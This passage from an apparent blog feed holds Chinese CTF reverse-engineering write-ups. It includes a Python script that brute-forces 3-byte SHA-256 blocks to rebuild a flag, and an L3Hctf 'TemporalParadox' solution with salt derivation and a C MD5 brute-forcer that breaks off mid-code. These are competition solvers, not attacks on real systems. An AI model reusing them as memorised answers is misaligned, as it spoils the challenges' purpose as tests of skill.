<span class="hljs-number">0x42</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xEA</span>,<br>    <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-comment"># 4</span><br>    <span class="hljs-number">0x67</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x81</span>,<br>    <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x29</span>,<br>    <span class="hljs-comment"># 5</span><br>    <span class="hljs-number">0x16</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x87</span>,<br>    <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x59</span>,<br>    <span class="hljs-comment"># 6</span><br>    <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x8D</span>,<br>    <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x96</span>,<br>    <span class="hljs-comment"># 7</span><br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0A</span>,<br>    <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x15</span>,<br>    <span class="hljs-comment"># 8</span><br>    <span class="hljs-number">0x48</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x59</span>,<br>    <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>,<br>    <span class="hljs-comment"># 9</span><br>    <span class="hljs-number">0x93</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5C</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xAA</span>,<br>    <span class="hljs-comment"># 10</span><br>    <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x83</span>,<br>    <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC0</span>,<br>    <span class="hljs-comment"># 11</span><br>    <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x29</span>,<br>    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x29</span>,<br>    <span class="hljs-comment"># 12</span><br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>,<br>    <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x87</span><br>]<br><br><span class="hljs-comment"># 转为 bytes</span><br>hashes_bytes = <span class="hljs-built_in">bytes</span>(hashes)<br><span class="hljs-comment"># 分割为 12 个 32 字节块</span><br>hash_list = [hashes_bytes[i:i+<span class="hljs-number">32</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">384</span>, <span class="hljs-number">32</span>)]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_3byte_sha256</span>(<span class="hljs-params">target_hash</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000000</span>):  <span class="hljs-comment"># 0x000000 ~ 0xFFFFFF</span><br>        b1 = (i &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span><br>        b2 = (i &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span><br>        b3 = i &amp; <span class="hljs-number">0xFF</span><br>        data = <span class="hljs-built_in">bytes</span>([b1, b2, b3])<br>        h = hashlib.sha256(data).digest()<br>        <span class="hljs-keyword">if</span> h == target_hash:<br>            <span class="hljs-keyword">return</span> data<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>result = []<br><span class="hljs-keyword">for</span> idx, h <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(hash_list):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Brute-forcing block <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>/12...&quot;</span>)<br>    plain = brute_force_3byte_sha256(h)<br>    <span class="hljs-keyword">if</span> plain <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Failed to crack block <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>        result.append(<span class="hljs-string">b&quot;???&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;    Found: <span class="hljs-subst">&#123;plain.<span class="hljs-built_in">hex</span>()&#125;</span> -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">repr</span>(plain)&#125;</span>&quot;</span>)<br>        result.append(plain)<br><br>flag = <span class="hljs-string">b&quot;&quot;</span>.join([block[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> result[::-<span class="hljs-number">1</span>]])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;argv[1] = <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(flag)&#125;</span> bytes&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>L3Hctf部分wp</title>
    <link href="/2025/08/02/L3Hctf%E9%83%A8%E5%88%86wp/"/>
    <url>/2025/08/02/L3Hctf%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="TemporalParadox"><a href="#TemporalParadox" class="headerlink" title="TemporalParadox"></a>TemporalParadox</h1><p>写这一题用了快半天的时间www，反正得先把函数都理解透了才行</p><p>先找到主函数入口，有一个花指令，nop掉之后反编译</p><p>这里直接跳转，中间插入的就是花指令</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507162340547.png" alt="image-20250716234017426"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930772.png" alt="image-20250716224607175"></p><p>注意，以下函数运行在所给的时间节点下v61 &gt; 1751990400 &amp;&amp; v61 &lt;&#x3D; 1752052051，主要看sub_140001963函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930156.png" alt="image-20250716231843615"></p><p>具体分析看注释</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507162319533.png" alt="image-20250716231900454"></p><p>大概就是通过计算两个表达式是否相等来决定字符串的拼接，然后计算字符串的md5的值看是否与所给的密文相等</p><p>Salt: tlkyeueq7fej8vtzitt26yl24kswrgm5  固定值，通过以下代码得到</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">import math<br><br>dword_14000B060 = [<br>    <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xFFFFFF94</span>, <span class="hljs-number">0xFFFFFF86</span>, <span class="hljs-number">0xFFFFFF9A</span>, <span class="hljs-number">0xFFFFFF8A</span>, <span class="hljs-number">0xFFFFFF9A</span>, <span class="hljs-number">0xFFFFFF8E</span>,<br>    <span class="hljs-number">0xFFE7AC2D</span>, <span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0xFFFFFF9A</span>, <span class="hljs-number">0x000000AE</span>, <span class="hljs-number">0xFFB70487</span>, <span class="hljs-number">0x000000D2</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x000000DE</span>,<br>    <span class="hljs-number">0xFFFFFF96</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0x000000CC</span>, <span class="hljs-number">0xFFFFE65F</span>, <span class="hljs-number">0xFFF7E40F</span>, <span class="hljs-number">0xFFFFFF86</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0xFFFFE65F</span>,<br>    <span class="hljs-number">0xFFFF1957</span>, <span class="hljs-number">0xFFFFFF94</span>, <span class="hljs-number">0xFFFFFF8C</span>, <span class="hljs-number">0xFFFFFF88</span>, <span class="hljs-number">0x000000C6</span>, <span class="hljs-number">0xFFFFFF98</span>, <span class="hljs-number">0xFFFFFF92</span>, <span class="hljs-number">0xFFFD4C05</span><br>]<br><br>salt_chars = []<br><br>for v9 <span class="hljs-keyword">in</span> dword_14000B060:<br>    if v9 &gt;= <span class="hljs-number">0x80000000</span>:  # 转换负数<br>        v9 -= <span class="hljs-number">0x100000000</span><br>    if v9 &gt;= <span class="hljs-number">0</span>:<br>        v10 = v9 // <span class="hljs-number">3</span> + <span class="hljs-number">48</span><br><span class="hljs-symbol">    else:</span><br>        if v9 &gt;= -<span class="hljs-number">728</span>:<br>            v10 = ~v9<br><span class="hljs-symbol">        else:</span><br>            v10 = <span class="hljs-keyword">int</span>(math<span class="hljs-number">.</span>log(-v9) / <span class="hljs-number">1.09861228866811</span> - <span class="hljs-number">6.0</span> + <span class="hljs-number">48.0</span>)<br>    salt_chars<span class="hljs-number">.</span>append(chr(v10))<br><br>salt = <span class="hljs-string">&#x27;&#x27;.join(salt_chars)</span><br><span class="hljs-string">print(&quot;Salt:&quot;, salt)</span><br></code></pre></td></tr></table></figure><p>r,a,b,x,y都与随机数生成有关，cipher的生成来自于函数sub_14000184D，同时也与两个置换盒有关</p><p>第 1～3 轮每轮用 sub_1400016A0的片段 xor 进状态，再做 s盒与p盒变换。</p><p>第 4 轮取第 4 片段 XOR，再做 仅 S盒；最后取第 5 片段再 xor，返回 cipher。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202507162331214.png" alt="image-20250716233103122"></p><p>这里的判断条件也与随机生成数有关，最终可以通过爆破来实现</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508020930916.png" alt="image-20250716233149894"></p><p>整个过程就可以分为字符串为salt&#x3D;xxx&amp;t&#x3D;xxx&amp;r&#x3D;xxx&amp;a&#x3D;xxx&amp;b&#x3D;xxx&amp;x&#x3D;xxx&amp;y&#x3D;xxx和salt&#x3D;xxx&amp;t&#x3D;xxx&amp;r&#x3D;xxx&amp;cipher&#x3D;xxx两种进行爆破（最终结果是满足salt&#x3D;xxx&amp;t&#x3D;xxx&amp;r&#x3D;xxx&amp;a&#x3D;xxx&amp;b&#x3D;xxx&amp;x&#x3D;xxx&amp;y&#x3D;xxx这个字符串爆破成功）</p><p>这里贴出脚本，由于要用到openssl这个库，我直接在虚拟机上运行代码了，安装这个库也比在windows端方便多</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-meta">#include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#include &lt;stdint.h&gt;</span><br><span class="hljs-meta">#include &lt;string.h&gt;</span><br><span class="hljs-meta">#include &lt;math.h&gt;</span><br><span class="hljs-meta">#include &lt;openssl/md5.h&gt;</span><br><span class="hljs-meta">#include &lt;openssl/sha.h&gt;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SALT &quot;tlkyeueq7fej8vtzitt26yl24kswrgm5&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TARGET_MD5 &quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> uint8_t SBOX[<span class="hljs-number">16</span>] = &#123;<br>    <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x01</span>,<br>    <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x08</span>,<br>    <span class="hljs-number">0x03</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x0C</span>,<br>    <span class="hljs-number">0x05</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span><br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> uint8_t PERM[<span class="hljs-number">16</span>] = &#123;<br>    <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13</span>,<br>    <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>,<br>    <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>,<br>    <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> inline uint32_t <span class="hljs-title">truncate_to_u32</span>(<span class="hljs-params">uint64_t v</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> (uint32_t)(v &amp; <span class="hljs-number">0xFFFFFFFF</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> int32_t <span class="hljs-title">to_signed32</span>(<span class="hljs-params">uint32_t v</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (v &amp; <span class="hljs-number">0x80000000</span>)<br>        <span class="hljs-keyword">return</span> (int32_t)(v - <span class="hljs-number">0x100000000</span>);<br>    <span class="hljs-keyword">return</span> (int32_t)v;<br>&#125;<br><br><span class="hljs-comment">// 伪随机数生成器</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">prng_generate</span>(<span class="hljs-params">uint32_t *state, uint32_t *output</span>)</span> &#123;<br>    uint32_t val = *state;<br>    uint32_t v1 = (((val &lt;&lt; <span class="hljs-number">13</span>) ^ val) &gt;&gt; <span class="hljs-number">17</span>) ^ ((val &lt;&lt; <span class="hljs-number">13</span>) ^ val);<br>    uint32_t new_val = (<span class="hljs-number">32</span> * v1) ^ v1;<br>    *state = new_val;<br>    *output = new_val &amp; <span class="hljs-number">0x7FFFFFFF</span>;<br>&#125;<br><br><span class="hljs-function">uint32_t <span class="hljs-title">apply_sbox</span>(<span class="hljs-params">uint32_t input</span>)</span> &#123;<br>    uint32_t s = input;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        uint8_t index = (s &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0xF</span>;<br>        s = ((s &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | SBOX[index];<br>    &#125;<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><br><span class="hljs-function">uint32_t <span class="hljs-title">apply_pbox</span>(<span class="hljs-params">uint32_t input</span>)</span> &#123;<br>    uint32_t s = input;<br>    uint32_t result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-built_in">int</span> src_bit = PERM[i] - <span class="hljs-number">1</span>; <br>        <span class="hljs-keyword">if</span> ((s &gt;&gt; src_bit) &amp; <span class="hljs-number">1</span>) &#123;<br>            result |= (<span class="hljs-number">1</span> &lt;&lt; i);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// 一轮加密变换</span><br><span class="hljs-function">uint32_t <span class="hljs-title">perform_round</span>(<span class="hljs-params">uint32_t state</span>)</span> &#123;<br>    state = apply_sbox(state);<br>    state = apply_pbox(state);<br>    <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-comment">// 生成某轮轮密钥</span><br><span class="hljs-function">uint16_t <span class="hljs-title">generate_round_key</span>(<span class="hljs-params">uint32_t key, <span class="hljs-built_in">int</span> round</span>)</span> &#123;<br>    uint32_t shifted = (key &lt;&lt; (<span class="hljs-number">4</span> * (round - <span class="hljs-number">1</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span>;<br>    <span class="hljs-keyword">return</span> (shifted 